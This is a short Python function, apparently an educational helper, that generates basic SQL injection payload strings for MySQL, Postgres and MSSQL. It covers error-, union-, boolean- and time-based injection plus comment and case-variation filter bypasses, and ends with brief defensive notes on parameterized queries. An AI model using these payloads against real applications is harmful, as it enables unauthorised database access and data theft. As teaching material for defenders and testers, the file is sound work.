def generate(db_type):
    """
    Advanced SQL Injection templates.
    Educational use only.
    """

    if not db_type:
        db_type = "mysql"

    db = db_type.lower()
    payloads = []

    payloads.append("# TEMPLATE - EDUCATIONAL USE ONLY")
    payloads.append(f"=== SQL Injection - {db.upper()} ===")
    payloads.append("")

    # ==========================
    # ERROR BASED
    # ==========================
    payloads.append("[Error-Based] ' OR 1=1 --")

    # ==========================
    # UNION BASED
    # ==========================
    payloads.append("[Union-Based] ' UNION SELECT NULL,NULL --")

    # DB-specific variations
    if db == "mysql":
        payloads.append("[MySQL Version Detection] ' UNION SELECT @@version,NULL --")

    elif db == "postgres":
        payloads.append("[Postgres Version Detection] ' UNION SELECT version(),NULL --")

    elif db == "mssql":
        payloads.append("[MSSQL Version Detection] ' UNION SELECT @@version,NULL --")

    # ==========================
    # BLIND SQLI
    # ==========================
    payloads.append("")
    payloads.append("[Blind Boolean] ' AND 1=1 --")
    payloads.append("[Time-Based Concept] ' AND SLEEP(5) --")

    # ==========================
    # BYPASS TECHNIQUES
    # ==========================
    payloads.append("")
    payloads.append("[Comment Bypass] ' OR 1=1 #")
    payloads.append("[Case Variation] ' UnIoN SeLeCt NULL,NULL --")

    # ==========================
    # DEFENSIVE NOTES
    # ==========================
    payloads.append("")
    payloads.append("=== Defensive Notes ===")
    payloads.append("Use prepared statements to prevent SQL injection.")
    payloads.append("Parameterized queries block malicious input.")
    payloads.append("WAF detects common patterns like OR 1=1.")

    return payloads
